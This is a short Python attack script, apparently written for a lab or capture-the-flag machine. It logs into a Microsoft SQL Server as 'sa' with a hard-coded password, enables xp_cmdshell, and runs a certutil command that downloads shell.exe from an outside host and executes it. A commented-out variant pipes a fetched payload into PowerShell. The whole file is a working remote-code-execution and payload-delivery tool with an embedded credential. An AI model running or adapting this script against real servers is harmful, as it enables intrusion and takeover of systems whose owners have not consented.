#!/usr/bin/env python
import _mssql
import sys

server="10.10.10.59"
user="sa"
password="GWE3V65#6KFH93@4GWTG2G"

def rce(command):
    try:
        conn = _mssql.connect(server, user, password)
        conn.execute_query("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE -- ")
        print "[+] xp_cmdshell enabled"
        conn.execute_query("EXEC master..xp_cmdshell '"+command+"'")
        print "[+] Command executed!"
    except:
        print "[-] Error!"

#command="certutil -urlcache -split -f http://10.10.14.25/payload1.txt c:\\temp\\payload1.txt & type c:\\temp\\payload1.txt|powershell -nop -"
command="certutil -urlcache -split -f http://10.10.14.25/shell.exe c:\\temp\\shell.exe & c:\\temp\\shell.exe"

rce(command)
